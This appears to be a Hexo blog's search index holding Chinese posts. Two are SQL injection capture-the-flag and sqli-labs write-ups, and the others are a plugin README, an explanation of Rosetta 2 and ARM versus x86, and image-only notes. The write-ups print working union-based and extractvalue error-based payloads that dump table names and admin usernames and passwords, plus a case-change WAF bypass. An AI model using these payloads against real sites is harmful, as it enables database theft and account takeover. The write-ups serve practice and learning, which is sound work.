<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>BUUCTF中SQL注入writeup</title>
      <link href="/2024/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/"/>
      <url>/2024/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/</url>
      
        <content type="html"><![CDATA[<h2 id="NewStarCTF-2023-公开赛道-ez-sql"><a href="#NewStarCTF-2023-公开赛道-ez-sql" class="headerlink" title="[NewStarCTF 2023 公开赛道]ez_sql"></a>[NewStarCTF 2023 公开赛道]ez_sql</h2><ol><li><h5 id="判断闭合方式为-’（单引号）"><a href="#判断闭合方式为-’（单引号）" class="headerlink" title="判断闭合方式为 ’（单引号）"></a>判断闭合方式为 <code>’</code>（单引号）</h5></li><li><h5 id="爆字段数，以成功联合注入"><a href="#爆字段数，以成功联合注入" class="headerlink" title="爆字段数，以成功联合注入"></a>爆字段数，以成功联合注入</h5></li></ol><p>​<code>?id=1&#39; order by 1 --+</code></p><p>​发现有WAF，这里使用大写绕过</p><p>​<code>?id=1&#39; Order by 1 --+</code></p><p>​一直尝试直到<code>?id=1&#39; Order by 6 --+</code>没有回显，说明字段数为5</p><ol start="3"><li><h5 id="联合注入爆数据库名"><a href="#联合注入爆数据库名" class="headerlink" title="联合注入爆数据库名"></a>联合注入爆数据库名</h5></li></ol><p>​可见，数据库名就是ctf</p><p>​到这里答案就是到手的鸭子了</p><ol start="4"><li><h5 id="顺藤摸瓜，找到表名"><a href="#顺藤摸瓜，找到表名" class="headerlink" title="顺藤摸瓜，找到表名"></a>顺藤摸瓜，找到表名</h5></li></ol><p><code>?id=1&#39; UNION SELECT 1,2,3,4,GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA =&#39;ctf&#39; --+</code></p><p>​</p><p>​显然flag在here_is_flag这个表中，但我们先要找到在哪个字段下（当然一般可以直接猜出来字段名为flag）</p><ol start="5"><li><h5 id="再找到字段名"><a href="#再找到字段名" class="headerlink" title="再找到字段名"></a>再找到字段名</h5></li></ol><p>​<code>?id=1&#39; UNION SELECT 1,2,3,4,GROUP_CONCAT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME =&#39;here_is_flag&#39; --+</code></p><ol start="6"><li><h5 id="查询字段值"><a href="#查询字段值" class="headerlink" title="查询字段值"></a>查询字段值</h5></li></ol><p>​大功告成</p><hr><h2 id="BUU-SQL-COURSE-1"><a href="#BUU-SQL-COURSE-1" class="headerlink" title="BUU SQL COURSE 1"></a>BUU SQL COURSE 1</h2><p>点进去发现有两个模块，一个新闻页面，一个登录页面。</p><ol><li><h5 id="找到注入位置"><a href="#找到注入位置" class="headerlink" title="找到注入位置"></a>找到注入位置</h5></li></ol><p>点开热点中的热点一，发现这里有一个php请求，猜测是否这里有sql注入（为什么呢）</p><ol start="2"><li><h5 id="开始注入（公式化）"><a href="#开始注入（公式化）" class="headerlink" title="开始注入（公式化）"></a>开始注入（公式化）</h5></li></ol><p>爆字段数</p><p>爆库名</p><p><code>?id=-1 union select 1,database() --+</code></p><p>爆表名</p><p><code>?id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;news&#39; --+</code></p><p>爆字段名</p><p><code>?id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;admin&#39; --+</code></p><p>爆字段值</p><p><code>?id=-1 union select 1,group_concat(username,&#39;,&#39;,password) from news.admin --+</code></p><p>得到账号密码后就去登录吧</p><p>完结撒花<em>★,°</em>:.☆(￣▽￣)&#x2F;$:<em>.°★</em> 。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -Web安全 -sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/11/10/node_modules/hexo-asset-img/README/"/>
      <url>/2024/11/10/node_modules/hexo-asset-img/README/</url>
      
        <content type="html"><![CDATA[<p align="center"><!-- <img src="docs/.vuepress/public/images/logo.png" alt="hexo-asset-img"> --></p><h1 align="center">hexo-asset-img</h1><p>English | <a href="README_zh.md">中文</a></p><blockquote><p>:cake: Hexo local image plugin: Convert the relative path of the image to asset_img</p></blockquote><p><a href=""><img src="https://img.shields.io/github/repo-size/yiyungent/hexo-asset-img.svg?style=flat" alt="repo size"></a><br><a href="https://github.com/yiyungent/hexo-asset-img/blob/master/LICENSE"><img src="https://img.shields.io/github/license/yiyungent/hexo-asset-img.svg?style=flat" alt="LICENSE"></a><br><a href="https://www.npmjs.com/package/hexo-asset-img"><img src="https://img.shields.io/npm/v/hexo-asset-img.svg" alt="NPM version"></a><br><a href="https://www.npmjs.com/package/hexo-asset-img"><img src="https://img.shields.io/npm/dt/hexo-asset-img" alt="NPM downloads"></a><br><a href="https://jq.qq.com/?_wv=1027&k=q5R82fYN"><img src="https://img.shields.io/badge/QQ%20Group-894031109-deepgreen" alt="QQ Group"></a></p><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>Use this plug-in to realize the preview of Markdown editors such as Typora and Hexo release preview, both of which can display pictures normally</p><h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-asset-img --save</span><br></pre></td></tr></table></figure><blockquote><p>Latest Dev</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install git://github.com/yiyungent/hexo-asset-img.git#main</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo-typora</span><br><span class="line">├── apppicker.jpg</span><br><span class="line">├── logo.png</span><br><span class="line">└── rules.jpg</span><br><span class="line">hexo-typora.md</span><br></pre></td></tr></table></figure><p>Make sure <code>post_asset_folder: true</code> in your <code>_config.yml</code>.</p><p><code>hexo-typora.md</code>: Just use <code>![logo](hexo-typora/logo.png)</code> to insert <code>logo.png</code>.</p><h3 id="Use-with-Typora"><a href="#Use-with-Typora" class="headerlink" title="Use with Typora"></a>Use with Typora</h3><ul><li><a href="https://moeci.com/posts/hexo-typora">Hexo + Typora + Hexo plug-in development to solve the inconsistency of image paths | yiyun’s Blog</a></li></ul><h2 id="Origin"><a href="#Origin" class="headerlink" title="Origin"></a>Origin</h2><p><a href="https://github.com/xcodebuild/hexo-asset-image">hexo-asset-image</a> No longer valid, probably starting from <code>Hexo 5</code>, and this repository has been archived </p><blockquote><p>Q: 为什么使用本地图片 而不是网络图片 (图床) ?<br>A:</p><ol><li>第三方图床不稳定, 容易丢失图片    </li><li>自行搭建图床, 随着上传错误图片, 删除文章而没有删除关联图片 次数的增多, 未引用图片越来越多, 图床中也越来越多的无用冗余图片, 还不方便删除, 也容易误删除     </li><li>本地图片 与 文章在一个文件夹, 易打包, 在无网络或网络较差时也能预览   </li><li>本地图片 放在与 文章文件名同名文件夹内 方便管理</li></ol><p><code>补充:</code><br>很多 <code>markdown编辑器</code> 提供粘贴图片到本地图片文件夹, 这些图片文件名通常不易读, 较长, 如果每次删除文章中的图片引用, 都手动去删除相应图片, 以及删除文章, 手动删除关联图片文件夹, 比较麻烦, 但不删除, 未引用图片又会越来越多, 因此 <code>删除未引用图片工具</code> 应运而生!      </p><ul><li><a href="https://github.com/yiyungent/clear-image-action">yiyungent&#x2F;clear-image-action: 🔧 Image detection. | 图片检测 | 清理未引用图片 | 删除未引用图片 | 检查引用的图片是否有效 | GitHub Actions</a></li><li><a href="https://github.com/yiyungent/coo">yiyungent&#x2F;coo: 🧰 .NET 自用CLI, 工具集</a></li></ul></blockquote><h2 id="Related-Projects"><a href="#Related-Projects" class="headerlink" title="Related Projects"></a>Related Projects</h2><ul><li><a href="https://github.com/yiyungent/clear-image-action">yiyungent&#x2F;clear-image-action: 🔧 Image detection. | 图片检测 | 清理未引用图片 | 删除未引用图片 | 检查引用的图片是否有效 | GitHub Actions</a></li><li><a href="https://github.com/xcodebuild/hexo-asset-image">xcodebuild&#x2F;hexo-asset-image</a></li><li><a href="https://github.com/cocowool/hexo-image-link">cocowool&#x2F;hexo-image-link</a></li><li><a href="https://github.com/cnzsb/hexo-asset">cnzsb&#x2F;hexo-asset</a></li></ul><h2 id="Donate"><a href="#Donate" class="headerlink" title="Donate"></a>Donate</h2><p>hexo-asset-img is an MIT licensed open source project and completely free to use. However, the amount of effort needed to maintain and develop new features for the project is not sustainable without proper financial backing.</p><p>We accept donations through these channels:</p><ul><li><a href="https://afdian.net/@yiyun" target="_blank">爱发电</a></li></ul><h2 id="Author"><a href="#Author" class="headerlink" title="Author"></a>Author</h2><p><strong>hexo-asset-img</strong> © <a href="https://github.com/yiyungent">yiyun</a>, Released under the <a href="./LICENSE">MIT</a> License.<br><br>Authored and maintained by yiyun with help from contributors (<a href="https://github.com/yiyungent/hexo-asset-img/contributors">list</a>).</p><blockquote><p>GitHub <a href="https://github.com/yiyungent">@yiyungent</a> Gitee <a href="https://gitee.com/yiyungent">@yiyungent</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/11/10/node_modules/hexo-asset-img/README_zh/"/>
      <url>/2024/11/10/node_modules/hexo-asset-img/README_zh/</url>
      
        <content type="html"><![CDATA[<p align="center"><!-- <img src="docs/.vuepress/public/images/logo.png" alt="hexo-asset-img"> --></p><h1 align="center">hexo-asset-img</h1><p><a href="README.md">English</a> | 中文</p><blockquote><p>:cake: Hexo 本地图片插件: 转换 图片相对路径 为 asset_img</p></blockquote><p><a href=""><img src="https://img.shields.io/github/repo-size/yiyungent/hexo-asset-img.svg?style=flat" alt="repo size"></a><br><a href="https://github.com/yiyungent/hexo-asset-img/blob/master/LICENSE"><img src="https://img.shields.io/github/license/yiyungent/hexo-asset-img.svg?style=flat" alt="LICENSE"></a><br><a href="https://www.npmjs.com/package/hexo-asset-img"><img src="https://img.shields.io/npm/v/hexo-asset-img.svg" alt="NPM version"></a><br><a href="https://www.npmjs.com/package/hexo-asset-img"><img src="https://img.shields.io/npm/dt/hexo-asset-img" alt="NPM downloads"></a><br><a href="https://jq.qq.com/?_wv=1027&k=q5R82fYN"><img src="https://img.shields.io/badge/QQ%20Group-894031109-deepgreen" alt="QQ Group"></a></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>使用本插件 即可实现 Typora 等 Markdown 编辑器预览 与 Hexo 发布预览 均能正常显示图片</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-asset-img --save</span><br></pre></td></tr></table></figure><blockquote><p>最新开发版</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install git://github.com/yiyungent/hexo-asset-img.git#main</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo-typora</span><br><span class="line">├── apppicker.jpg</span><br><span class="line">├── logo.png</span><br><span class="line">└── rules.jpg</span><br><span class="line">hexo-typora.md</span><br></pre></td></tr></table></figure><p>Make sure <code>post_asset_folder: true</code> in your <code>_config.yml</code>.</p><p><code>hexo-typora.md</code>: Just use <code>![logo](hexo-typora/logo.png)</code> to insert <code>logo.png</code>.</p><h3 id="与-Typora-配合使用"><a href="#与-Typora-配合使用" class="headerlink" title="与 Typora 配合使用"></a>与 Typora 配合使用</h3><ul><li><a href="https://moeci.com/posts/hexo-typora">Hexo + Typora + 开发Hexo插件 解决图片路径不一致 | yiyun’s Blog</a></li></ul><h2 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h2><p><a href="https://github.com/xcodebuild/hexo-asset-image">hexo-asset-image</a> 已无效, 大概是从 <code>Hexo 5</code> 开始，并且此仓库已 archived </p><blockquote><p>Q: 为什么使用本地图片 而不是网络图片 (图床) ?<br>A:</p><ol><li>第三方图床不稳定, 容易丢失图片    </li><li>自行搭建图床, 随着上传错误图片, 删除文章而没有删除关联图片 次数的增多, 未引用图片越来越多, 图床中也越来越多的无用冗余图片, 还不方便删除, 也容易误删除     </li><li>本地图片 与 文章在一个文件夹, 易打包, 在无网络或网络较差时也能预览   </li><li>本地图片 放在与 文章文件名同名文件夹内 方便管理</li></ol><p><code>补充:</code><br>很多 <code>markdown编辑器</code> 提供粘贴图片到本地图片文件夹, 这些图片文件名通常不易读, 较长, 如果每次删除文章中的图片引用, 都手动去删除相应图片, 以及删除文章, 手动删除关联图片文件夹, 比较麻烦, 但不删除, 未引用图片又会越来越多, 因此 <code>删除未引用图片工具</code> 应运而生!      </p><ul><li><a href="https://github.com/yiyungent/clear-image-action">yiyungent&#x2F;clear-image-action: 🔧 Image detection. | 图片检测 | 清理未引用图片 | 删除未引用图片 | 检查引用的图片是否有效 | GitHub Actions</a></li><li><a href="https://github.com/yiyungent/coo">yiyungent&#x2F;coo: 🧰 .NET 自用CLI, 工具集</a></li></ul></blockquote><h2 id="相关项目"><a href="#相关项目" class="headerlink" title="相关项目"></a>相关项目</h2><ul><li><a href="https://github.com/yiyungent/clear-image-action">yiyungent&#x2F;clear-image-action: 🔧 Image detection. | 图片检测 | 清理未引用图片 | 删除未引用图片 | 检查引用的图片是否有效 | GitHub Actions</a></li><li><a href="https://github.com/xcodebuild/hexo-asset-image">xcodebuild&#x2F;hexo-asset-image</a></li><li><a href="https://github.com/cocowool/hexo-image-link">cocowool&#x2F;hexo-image-link</a></li><li><a href="https://github.com/cnzsb/hexo-asset">cnzsb&#x2F;hexo-asset</a></li></ul><h2 id="Donate"><a href="#Donate" class="headerlink" title="Donate"></a>Donate</h2><p>hexo-asset-img is an MIT licensed open source project and completely free to use. However, the amount of effort needed to maintain and develop new features for the project is not sustainable without proper financial backing.</p><p>We accept donations through these channels:</p><ul><li><a href="https://afdian.net/@yiyun" target="_blank">爱发电</a></li></ul><h2 id="Author"><a href="#Author" class="headerlink" title="Author"></a>Author</h2><p><strong>hexo-asset-img</strong> © <a href="https://github.com/yiyungent">yiyun</a>, Released under the <a href="./LICENSE">MIT</a> License.<br><br>Authored and maintained by yiyun with help from contributors (<a href="https://github.com/yiyungent/hexo-asset-img/contributors">list</a>).</p><blockquote><p>GitHub <a href="https://github.com/yiyungent">@yiyungent</a> Gitee <a href="https://gitee.com/yiyungent">@yiyungent</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-lab（一）</title>
      <link href="/2024/11/09/sql-lab/"/>
      <url>/2024/11/09/sql-lab/</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL特性"><a href="#MySQL特性" class="headerlink" title="MySQL特性"></a>MySQL特性</h1><img src="/2024/11/09/sql-lab/sql-1.png" class="" title="sql-1"><p>图内补充：<br>table_schema ： 表归属于的数据库</p><p>information_schema：这是一个mysql自带的库，其中保存着关于mysql服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表列的数据类型与访问权限等，所以我们查询这个库</p><p>查询当前用户：<code>select user（）</code></p><p>数据库版本： <code>select version （）</code></p><p>数据库名： <code>select database（）</code></p><p>查看数据库&#x2F;表：<code>show databases/tables；</code></p><p>切换数据库： <code>use 数据库名</code></p><p>基础查询：<code>select 字段1， 字段2, … from 表名；</code>   <code>select * from 表名；</code></p><p>条件查询：<code>select 字段 from 表名 where 条件</code></p><p><strong>联合查询：<code>select * from 表名 union select 1，2，3</code></strong>  </p><p>排序： <code>select * from 表名 order by 字段</code></p><hr><h1 id="SQL注入常见类型"><a href="#SQL注入常见类型" class="headerlink" title="SQL注入常见类型"></a>SQL注入常见类型</h1><h2 id="按注入点类型分类"><a href="#按注入点类型分类" class="headerlink" title="按注入点类型分类"></a>按注入点类型分类</h2><h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p>当输入的参数x为整形时，即select  *  from  &lt;表名 &gt;  where id &#x3D; x</p><p>判断： 1 and 1 &#x3D; 1           1 and 1 &#x3D; 2        比较两者的返回页面</p><h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>当输入的参数x为字符型时，即select * from &lt;表名&gt; where id &#x3D; ‘x’</p><p>判断： 1‘ and ‘1’ &#x3D; ‘1          1’ and ‘1’ &#x3D; ‘2 </p><h2 id="按获取方式分类"><a href="#按获取方式分类" class="headerlink" title="按获取方式分类"></a><strong>按获取方式分类</strong></h2><h3 id="基于报错的注入"><a href="#基于报错的注入" class="headerlink" title="基于报错的注入"></a>基于报错的注入</h3><p>利用页面回显的数据库报错信息</p><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>在注入点的判断过程中，SQL语句执行后的报错信息会经过后端显示在页面中华</p><h4 id="常见可利用函数"><a href="#常见可利用函数" class="headerlink" title="常见可利用函数"></a>常见可利用函数</h4><p>floor()<strong>extractvalue()updatexml()</strong>geometrycollection()polygon()multipolygon()</p><p><strong>concat()</strong></p><h5 id="concat"><a href="#concat" class="headerlink" title="concat"></a>concat</h5><p><code>concat(str1, str2,…)</code></p><p>将多个字符串连接成一个字符串</p><h5 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat"></a>group_concat</h5><p><code>group_concat( [DISTINCT] 要连接的字段 [Order BY 排序字段 ASC/DESC] [Separator ‘分隔符’] )</code></p><p>使用distinct可以排除重复值</p><p>如果需要对结果中的值进行排序，可以使用order by子句</p><p>separator是一个字符串值，默认为逗号</p><h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h5><p><code>extractvalue(&#39;目标xml文件名&#39;,&#39;在xml中查询的字符串&#39;)</code></p><p>从目标xml文件中返回包含查询值的字符串</p><p><strong>extractvalue函数一次只能查询32位长度</strong></p><p>解决方案：</p><ol><li>加上<code>limit x,1</code> 逐一查询</li><li>用group_concat函数把查询结果分组聚合，然后用<code>and xxxx not in ’xxx‘，’xxx‘</code>过滤掉前面回显的</li><li>用<code>substring()</code>截取</li></ol><h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h5><p><code>updatexml(&#39;目标xml文件名&#39;,&#39;在xml中查询的字符串&#39;,&#39;替换后的值&#39;)</code></p><p>修改xml文件中符合字符串的值</p><h3 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h3><p>利用页面返回的不一致</p><h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><p>利用页面响应时间</p><h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><p>使用union关键字</p><h3 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h3><p>执行多条SQL语句</p><hr><h1 id="SQLi-labs"><a href="#SQLi-labs" class="headerlink" title="SQLi-labs"></a>SQLi-labs</h1><h3 id="lesson-1"><a href="#lesson-1" class="headerlink" title="lesson 1"></a>lesson 1</h3><ol><li><p>验证是字符型还是数字型注入</p></li><li><p>查询当前数据库</p><p><code>?id= 1&#39; and (select extractvalue(1,concat(0x7e,(select database()),0x7e))) --+</code>、</p><img src="/2024/11/09/sql-lab/image-20241110003235758.png" class="" title="image-20241110003235758"><p>爆出数据库名为security</p><p>当然用union也可以</p></li><li><p>查询表名</p></li></ol><p><code>?id= 1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),0x7e))) --+</code></p><img src="/2024/11/09/sql-lab/image-20241110004543422.png" class="" title="image-20241110004543422"><ol start="4"><li>查询字段名</li></ol><p><code>?id= 1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;emails&#39;),0x7e))) --+</code></p><img src="/2024/11/09/sql-lab/image-20241110005049115.png" class="" title="image-20241110005049115"><ol start="5"><li>查询字段值</li></ol><p><code>?id= 1&#39; and (select extractvalue(1,concat(0x7e,(select group_concat(id,&#39;,&#39;,email_id) from security.emails),0x7e))) --+</code></p><img src="/2024/11/09/sql-lab/image-20241110005953540.png" class="" title="image-20241110005953540"><p>发现没有显示完</p><p><code>?id= 1&#39; and (select extractvalue(1,concat(0x7e,(select substring(group_concat(id,&#39;,&#39;,email_id),80,40) from security.emails),0x7e))) --+</code></p><img src="/2024/11/09/sql-lab/image-20241110010136450.png" class="" title="image-20241110010136450"><p>试着这样查询一下账号和密码吧</p><h3 id="lesson-2"><a href="#lesson-2" class="headerlink" title="lesson 2"></a>lesson 2</h3><p>过程和lesson 1一样。只不过是数字型注入。</p><h3 id="lesson-3"><a href="#lesson-3" class="headerlink" title="lesson 3"></a>lesson 3</h3><p>过程和lesson 1一样，不过闭合方式为 ‘）</p><h3 id="lesson-4"><a href="#lesson-4" class="headerlink" title="lesson 4"></a>lesson 4</h3><p>过程和lesson 1一样，不过闭合方式为 ”）</p><h3 id="lesson-5"><a href="#lesson-5" class="headerlink" title="lesson 5"></a>lesson 5</h3><p>也可以这样做</p><h3 id="lesson-6"><a href="#lesson-6" class="headerlink" title="lesson 6"></a>lesson 6</h3><p>也可以这样做</p><p>怎么都有报错回显。布尔盲注和时间盲注有点暴力有点纯。使用sqlmap会好得多但是我暂时不会用</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>苹果的罗塞塔石碑 —— Rosetta 2</title>
      <link href="/2024/11/09/Rosetta/"/>
      <url>/2024/11/09/Rosetta/</url>
      
        <content type="html"><![CDATA[<h2 id="ARM架构与x86架构"><a href="#ARM架构与x86架构" class="headerlink" title="ARM架构与x86架构"></a>ARM架构与x86架构</h2><p><strong>指令集架构（ISA</strong>）是计算机硬件与软件之间的接口规范，定义了处理器可以执行的基本指令（如算术运算、数据传输、控制转移等）、指令格式、寻址模式以及相关的寄存器和数据类型。简单来说，它就像是处理器的“语言”（<strong>CPU预定义的操作和计算</strong>），让程序员能够编写可以在特定架构上运行的软件，同时也帮助设计处理器的工程师理解如何实现这些指令（简化程序员的工作）。</p><p>那如果要简化程序员的工作，这意味着微处理器的工作十分复杂。<del>甲方只需要提要求就好了，而乙方需要考虑的就多了。</del>那到底是应该简化程序员的工作，还是简化微处理器的工作？</p><p>由此产生了两种想法：<strong>CISC</strong> 和 <strong>RISC</strong></p><p><strong>x86</strong>：<strong>基于CISC的处理器架构</strong>，拥有非常丰富的指令集。一条指令可以完成整个计算（如乘法）或将一块数据直接从内存中的一个位置移动到另一个位置，并且这一系列复杂的操作可以在一个周期内完成。但这也意味着它需要更多的晶体管，从而会占用控件并消耗能量。</p><p><strong>ARM</strong>：<strong>基于RISC的处理器架构</strong>，每条指令仅代表一个能耗较低的简单操作。这使得汇编语言程序员的工作变得更加复杂，但却简化了处理器的工作。利用RISC处理器和先进的RISC计算机，可以通过运行多条指令或通过将复杂工作推给编译器（而不是CPU内核）来执行复杂工作。</p><p>两种CPU设计都具有高性能，但ARM设计往往侧重于更小巧的外形、电池使用时间、尺寸、免除散热要求和成本。</p><p>具体可见 <a href="https://pocon041.github.io/2024/11/06/%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/">指令系统 | Pocon’s Blog</a></p><hr><h2 id="Mac向Apple芯片迁移"><a href="#Mac向Apple芯片迁移" class="headerlink" title="Mac向Apple芯片迁移"></a>Mac向Apple芯片迁移</h2><p>在2020年6月22日的苹果全球开发者大会上，苹果公司CEO蒂姆·库克宣布将Mac电脑从英特尔的x86-64的处理器平台迁移至ARM64架构的Apple芯片（由苹果自行设计的处理器）。（在此之前也有过迁移经历）</p><p>既然是两种不同的指令集架构，苹果是如何实现让Intel平台上开发的软件在ARM架构平台的Mac上顺利运行的呢？</p><hr><h2 id="Rosetta-2"><a href="#Rosetta-2" class="headerlink" title="Rosetta 2"></a>Rosetta 2</h2><p>在此之前，先让我讲讲另一种实现机制：<strong>通用二进制</strong></p><p>通用二进制是一种将多个架构的代码打包在同一个可执行文件中的技术。（由于这些多平台可执行程序文件容量比原来要大，所以也称为<strong>胖二进制</strong>。）该文件包含针对不同架构的机器代码，操作系统在运行时根据硬件架构选择合适的代码段执行。</p><p>换而言之，也就是提供多个翻译版本，选你看得懂的那个。</p><blockquote><p>[!WARNING]</p><p>以下为个人见解</p></blockquote><p>制作和优化其应用的ARM版本需要时间。创建通用二进制文件需要对源代码进行修改和测试，因此开发的复杂性会大幅提升。为了提供更灵活使用的解决方案，在当时<strong>Rosetta</strong>成为主流，而通用二进制版本需要更长的时间来推广和普及。</p><p>换而言之，两个国家的人（Intel和Silicon）说的是不同的语言，彼此听不懂对方的话，还好的是都是用嘴说，声音通过空气传播，别人也都是用耳朵听的。那么，中间有个翻译（Rosetta），可以把一种语言翻译成另外一种。</p><p><strong>Rosetta</strong>：一种动态翻译工具。允许已经存在的Intel x86应用在Apple Silicon（ARM架构）上运行，而无需开发者重新编译或发布新的版本。这使得用户能够立即继续使用他们的旧软件，无缝过渡到新硬件上。</p><p>苹果公司声称：那些重视用户互动而较少计算量的应用程序（比如word等文字处理器）是比较适合同归哦Rosetta编译的；而需要大计算量的程序，比如Photoshop需要另外的通用二进制版本。</p><p><strong>Rosetta 2</strong>：Rosetta 2预装在使用Apple Silicon芯片的Mac电脑的操作系统上。它可以将AMD64指令进行翻译。与Rosetta不同的是，Rosetta 2在安装软件时会把Intel版本程序转化为ARM程序，加上Apple的处理器性能很高，因此即使需要大计算量的程序，通过  Rosetta 2编译也能流畅地执行。（Intel版本Mac操作系统上地应用程序）</p><p>让我们（浅显的）深入探讨一下底层原因：</p><ol><li>尽管指令集不同，ARM和Intel底层架构有较高相似度（具体我不知道为啥）。x86指令集虽然复杂，但Rosetta 2只需要支持其中的子集，也就是用户态指令。并且两套指令都是小端存储。</li><li>最大障碍是内存排序（内存一致性模型不一样），即两个CPU在内存中看到彼此修改的顺序不一样。所以苹果将Intel的内存排序添加到他们的CPU中<del>（这也太暴力了）</del>。在运行转换后的x86代码时，它们会通过一个后门开关切换CPU的模式以符合Intel的内存排序。</li></ol><p>参考链接：</p><p><a href="https://www.redhat.com/zh/topics/linux/ARM-vs-x86">https://www.redhat.com/zh/topics/linux/ARM-vs-x86</a></p><p><a href="https://zh.wikipedia.org/wiki/Mac%E5%90%91Apple%E8%8A%AF%E7%89%87%E8%BF%81%E7%A7%BB">Mac向Apple芯片迁移 - 维基百科，自由的百科全书</a></p><p><a href="https://zh.wikipedia.org/wiki/Rosetta">Rosetta - 维基百科，自由的百科全书</a></p><p><a href="https://www.v2ex.com/t/726640">哪位老哥能解释一下 Rosetta 的实现原理？ - V2EX</a></p><p><a href="https://www.bilibili.com/opus/850506105874284549">【转】苹果的 Rosetta 2 的实现原理大概是怎样的？ - 哔哩哔哩</a></p><p><a href="https://juejin.cn/post/6978804300768083976#heading-0">https://juejin.cn/post/6978804300768083976#heading-0</a></p><p><a href="https://x.com/ErrataRob/status/1331750197836345345">(20) Robert Graham 𝕏 on X: “19&#x2F; …even when translating x86 code, all that reference counting overhead (already more efficient than garbage collection) gets dropped in half. Yet another weird performance enhance to add to all the others.” &#x2F; X</a></p><p><a href="https://zh.wikipedia.org/wiki/%E5%86%85%E5%AD%98%E6%8E%92%E5%BA%8F">内存排序 - 维基百科，自由的百科全书</a></p>]]></content>
      
      
      <categories>
          
          <category> 计算机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成与系统结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>指令系统</title>
      <link href="/2024/11/06/%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/"/>
      <url>/2024/11/06/%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<img src="/2024/11/06/%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/image-zhiling1.png" class="" title="zhiling1"><img src="/2024/11/06/%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/zhiling2.png" class="" title="zhiling2"><img src="/2024/11/06/%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/zhiling3.png" class="" title="zhiling3"><img src="/2024/11/06/%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F/zhiling4.png" class="" title="zhiling4">]]></content>
      
      
      <categories>
          
          <category> 计算机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成与系统结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机系统结构</title>
      <link href="/2024/11/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84/"/>
      <url>/2024/11/06/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84/</url>
      
